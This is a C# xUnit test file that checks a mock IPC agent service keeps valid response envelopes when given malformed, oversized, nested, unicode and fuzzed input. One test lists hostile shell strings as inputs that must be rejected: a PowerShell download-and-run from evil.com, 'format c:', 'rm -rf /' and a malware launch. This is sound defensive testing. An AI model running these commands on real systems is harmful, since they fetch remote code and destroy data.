using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using WinLab.Agent.Mock;
using WinLab.Contracts;
using Xunit;

namespace WinLab.Tests
{
    public class AdversarialBoundaryTests
    {
        private readonly MockAgentService _service = new MockAgentService();

        private void AssertResponseConforms<T>(IpcResponse<T> response, bool? expectedSuccess = null, string? expectedErrorCode = null)
        {
            Assert.NotNull(response);

            // Rule 1: Id must be valid Guid
            Assert.False(string.IsNullOrWhiteSpace(response.Id));
            Assert.True(Guid.TryParse(response.Id, out _), $"Response.Id '{response.Id}' must be a valid Guid.");

            // Rule 2: ReplyToId must be non-null string
            Assert.NotNull(response.ReplyToId);

            // Rule 3: Success state validation
            if (expectedSuccess.HasValue)
            {
                Assert.Equal(expectedSuccess.Value, response.Success);
            }

            if (response.Success)
            {
                Assert.Null(response.Error);
                Assert.Null(response.ErrorCode);
                Assert.NotNull(response.Data);
            }
            else
            {
                Assert.False(string.IsNullOrWhiteSpace(response.Error), "Failed response must have non-empty Error.");
                Assert.False(string.IsNullOrWhiteSpace(response.ErrorCode), "Failed response must have non-empty ErrorCode.");
                Assert.Null(response.Data);
            }

            if (expectedErrorCode != null)
            {
                Assert.Equal(expectedErrorCode, response.ErrorCode);
            }

            // Rule 4: Round-trip JSON serialization
            string json = JsonSerializer.Serialize(response);
            Assert.False(string.IsNullOrWhiteSpace(json));
            using var doc = JsonDocument.Parse(json);
            Assert.Equal(response.Id, doc.RootElement.GetProperty("id").GetString());
            Assert.Equal(response.Success, doc.RootElement.GetProperty("success").GetBoolean());
        }

        [Theory]
        [InlineData("null")]
        [InlineData("true")]
        [InlineData("false")]
        [InlineData("0")]
        [InlineData("12345")]
        [InlineData("-987654321")]
        [InlineData("3.1415926535")]
        [InlineData("\"a plain string\"")]
        [InlineData("\"\"")]
        [InlineData("[]")]
        [InlineData("[1, 2, 3]")]
        [InlineData("[{\"id\": \"item\"}]")]
        public async Task NonObjectJsonTokens_ConformToIpcResponseSchema(string token)
        {
            var resp = await _service.HandleRequestAsync(token);
            AssertResponseConforms(resp, expectedSuccess: false, expectedErrorCode: "INVALID_ENVELOPE_SCHEMA");
        }

        [Theory]
        [InlineData("")]
        [InlineData(" ")]
        [InlineData("   ")]
        [InlineData("\t\t")]
        [InlineData("\r\n\r\n")]
        [InlineData(" \t \r\n ")]
        public async Task EmptyOrWhitespacePayload_ConformsToIpcResponseSchema(string empty)
        {
            var resp = await _service.HandleRequestAsync(empty);
            AssertResponseConforms(resp, expectedSuccess: false, expectedErrorCode: "MALFORMED_JSON");
        }

        [Fact]
        public async Task EmptyObject_ConformsToIpcResponseSchema()
        {
            var resp = await _service.HandleRequestAsync("{}");
            AssertResponseConforms(resp, expectedSuccess: false, expectedErrorCode: "INVALID_ENVELOPE_ID");
        }

        [Theory]
        [InlineData("{\"id\": \"\", \"type\": \"query\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_ID")]
        [InlineData("{\"id\": \"   \", \"type\": \"query\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_ID")]
        [InlineData("{\"id\": 12345, \"type\": \"query\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_ID")]
        [InlineData("{\"id\": true, \"type\": \"query\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_ID")]
        [InlineData("{\"id\": [1, 2], \"type\": \"query\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_ID")]
        [InlineData("{\"id\": {\"k\": \"v\"}, \"type\": \"query\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_ID")]
        [InlineData("{\"id\": \"req-1\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_TYPE")]
        [InlineData("{\"id\": \"req-1\", \"type\": \"invalid_type\", \"action\": \"inventory.query\"}", "INVALID_ENVELOPE_TYPE")]
        [InlineData("{\"id\": \"req-1\", \"type\": \"query\"}", "EMPTY_ACTION")]
        [InlineData("{\"id\": \"req-1\", \"type\": \"query\", \"action\": \"\"}", "EMPTY_ACTION")]
        [InlineData("{\"id\": \"req-1\", \"type\": \"query\", \"action\": \"   \"}", "EMPTY_ACTION")]
        [InlineData("{\"id\": \"req-1\", \"type\": \"query\", \"action\": \"unauthorized.action\"}", "UNAUTHORIZED_ACTION")]
        [InlineData("{\"id\": \"req-1\", \"type\": \"command\", \"action\": \"policy.apply\"}", "PRIVILEGED_EXECUTOR_DISABLED")]
        [InlineData("{\"id\": \"req-1\", \"type\": \"command\", \"action\": \"policy.rollback\"}", "PRIVILEGED_EXECUTOR_DISABLED")]
        public async Task InvalidEnvelopeFields_ConformToIpcResponseSchema(string reqJson, string expectedErrorCode)
        {
            var resp = await _service.HandleRequestAsync(reqJson);
            AssertResponseConforms(resp, expectedSuccess: false, expectedErrorCode: expectedErrorCode);
        }

        [Fact]
        public async Task OversizedPayload_100KB_ConformsToIpcResponseSchema()
        {
            string payload = new string('A', 100 * 1024);
            string req = $"{{\"id\": \"req-100k\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": \"{payload}\"}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal("req-100k", resp.ReplyToId);
        }

        [Fact]
        public async Task OversizedPayload_1MB_ConformsToIpcResponseSchema()
        {
            string payload = new string('B', 1024 * 1024);
            string req = $"{{\"id\": \"req-1mb\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": \"{payload}\"}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal("req-1mb", resp.ReplyToId);
        }

        [Fact]
        public async Task OversizedPayload_5MB_ConformsToIpcResponseSchema()
        {
            string payload = new string('C', 5 * 1024 * 1024);
            string req = $"{{\"id\": \"req-5mb\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": \"{payload}\"}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal("req-5mb", resp.ReplyToId);
        }

        [Fact]
        public async Task OversizedPayload_10KArrayElements_ConformsToIpcResponseSchema()
        {
            var largeArray = string.Join(",", Enumerable.Range(1, 10000));
            string req = $"{{\"id\": \"req-arr\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": [{largeArray}]}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal("req-arr", resp.ReplyToId);
        }

        [Fact]
        public async Task DeeplyNestedStructure_30Levels_ConformsToIpcResponseSchema()
        {
            var sb = new StringBuilder();
            sb.Append("{\"id\": \"req-nest30\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": ");
            for (int i = 0; i < 30; i++) sb.Append("{\"nested\": ");
            sb.Append("\"leaf\"");
            for (int i = 0; i < 30; i++) sb.Append('}');
            sb.Append('}');
            var resp = await _service.HandleRequestAsync(sb.ToString());
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal("req-nest30", resp.ReplyToId);
        }

        [Fact]
        public async Task DeeplyNestedStructure_ExceedingMaxDepth_CaughtGracefully()
        {
            var sb = new StringBuilder();
            sb.Append("{\"id\": \"req-nest100\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": ");
            for (int i = 0; i < 100; i++) sb.Append("{\"nested\": ");
            sb.Append("\"leaf\"");
            for (int i = 0; i < 100; i++) sb.Append('}');
            sb.Append('}');
            var resp = await _service.HandleRequestAsync(sb.ToString());
            AssertResponseConforms(resp, expectedSuccess: false, expectedErrorCode: "MALFORMED_JSON");
        }

        [Fact]
        public async Task ExtremeFieldLengths_50KId_PreservedConforming()
        {
            string hugeId = "ID-" + new string('x', 50000);
            string req = $"{{\"id\": \"{hugeId}\", \"type\": \"query\", \"action\": \"inventory.query\"}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal(hugeId, resp.ReplyToId);
        }

        [Fact]
        public async Task UnicodeNullByteAndMultiLingual_ConformsToIpcResponseSchema()
        {
            string req = "{\"id\": \"req-unicode\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": \"test\\u0000null | 你好 | שלום | مرحبا | 🚀🔒🎓\"}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal("req-unicode", resp.ReplyToId);
        }

        [Fact]
        public async Task BidiAndZeroWidth_ConformsToIpcResponseSchema()
        {
            string req = "{\"id\": \"req-bidi\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": \"normal \\u202Ereversed\\u202C text and \\u200B\\u200C\\u200D zero width\"}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal("req-bidi", resp.ReplyToId);
        }

        [Theory]
        [InlineData("powershell.exe -NoProfile -Command Write-Host evil")]
        [InlineData("cmd.exe /c format c:")]
        [InlineData("pwsh.exe -c Get-Process")]
        [InlineData("bash -c 'rm -rf /'")]
        [InlineData("eval('process.exit(1)')")]
        [InlineData("invoke-expression (New-Object Net.WebClient)")]
        [InlineData("iex (New-Object Net.WebClient).DownloadString('http://evil.com')")]
        [InlineData("DownloadString('http://evil.com/payload.ps1')")]
        [InlineData("System.Diagnostics.Process.Start('calc.exe')")]
        [InlineData("WScript.Shell Run('malware.exe')")]
        public async Task ShellInjectionAttempts_RejectedWithConformingResponse(string injection)
        {
            string req = $"{{\"id\": \"req-inj\", \"type\": \"query\", \"action\": \"inventory.query\", \"payload\": \"{injection.Replace("\\", "\\\\")}\"}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: false, expectedErrorCode: "FORBIDDEN_SHELL_INJECTION");
        }

        [Theory]
        [InlineData("command")]
        [InlineData("script")]
        [InlineData("shell")]
        [InlineData("exec")]
        [InlineData("rawscript")]
        [InlineData("powershell")]
        [InlineData("cmd")]
        public async Task DisallowedCommandFieldsInPayload_RejectedWithConformingResponse(string field)
        {
            string req = $"{{\"id\": \"req-field\", \"type\": \"command\", \"action\": \"config.validate\", \"payload\": {{\"{field}\": \"safe\"}}}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: false, expectedErrorCode: "FORBIDDEN_COMMAND_FIELD");
        }

        [Theory]
        [InlineData(IpcConstants.ActionQueryInventory)]
        [InlineData(IpcConstants.ActionQueryPolicyState)]
        [InlineData(IpcConstants.ActionQueryPreflight)]
        [InlineData(IpcConstants.ActionListPresets)]
        [InlineData(IpcConstants.ActionPreviewPolicyDiff)]
        public async Task AllAllowedActions_ConformToIpcResponseSchema(string action)
        {
            string req = $"{{\"id\": \"req-{action}\", \"type\": \"query\", \"action\": \"{action}\"}}";
            var resp = await _service.HandleRequestAsync(req);
            AssertResponseConforms(resp, expectedSuccess: true);
            Assert.Equal($"req-{action}", resp.ReplyToId);
        }

        [Fact]
        public async Task HighThroughputConcurrentRequests_AllConformToSchema()
        {
            int concurrency = 500;
            var tasks = Enumerable.Range(0, concurrency).Select(async i =>
            {
                string action = (i % 3) switch
                {
                    0 => IpcConstants.ActionQueryInventory,
                    1 => IpcConstants.ActionQueryPolicyState,
                    _ => IpcConstants.ActionQueryPreflight
                };

                string req = $"{{\"id\": \"conc-{i}\", \"type\": \"query\", \"action\": \"{action}\"}}";
                var resp = await _service.HandleRequestAsync(req);
                return (Index: i, Response: resp);
            }).ToList();

            var results = await Task.WhenAll(tasks);
            Assert.Equal(concurrency, results.Length);

            foreach (var (index, response) in results)
            {
                AssertResponseConforms(response, expectedSuccess: true);
                Assert.Equal($"conc-{index}", response.ReplyToId);
            }
        }

        [Fact]
        public async Task RandomizedFuzzEnvelopes_1000Iterations_ConformToSchema()
        {
            var rng = new Random(42);
            string[] fuzzKeys = new[] { "command", "script", "shell", "exec", "id", "type", "action", "payload", "randomField" };
            string[] fuzzActions = new[] { IpcConstants.ActionQueryInventory, IpcConstants.ActionQueryPolicyState, "unauthorized.action", IpcConstants.ActionApplyPolicies };

            for (int i = 0; i < 1000; i++)
            {
                string id = (i % 4 == 0) ? $"fuzz-{i}" : (i % 4 == 1 ? $"{i}" : (i % 4 == 2 ? "" : "   "));
                string type = (i % 3 == 0) ? "query" : (i % 3 == 1 ? "invalid_type" : "command");
                string action = fuzzActions[i % fuzzActions.Length];

                string payloadJson;
                int pMode = i % 5;
                if (pMode == 0) payloadJson = $"\"{Guid.NewGuid()}\"";
                else if (pMode == 1) payloadJson = $"{{\"key{i}\": {i}}}";
                else if (pMode == 2) payloadJson = $"[1, {i}, 3]";
                else if (pMode == 3) payloadJson = "null";
                else payloadJson = $"{{\"{fuzzKeys[i % fuzzKeys.Length]}\": \"value{i}\"}}";

                string fuzzEnvelope = $"{{\"id\": \"{id}\", \"type\": \"{type}\", \"action\": \"{action}\", \"payload\": {payloadJson}}}";
                if (i % 7 == 0) fuzzEnvelope = fuzzEnvelope.Substring(0, Math.Max(5, fuzzEnvelope.Length - 5)); // Truncate randomly

                var resp = await _service.HandleRequestAsync(fuzzEnvelope);
                AssertResponseConforms(resp);
            }
        }
    }
}
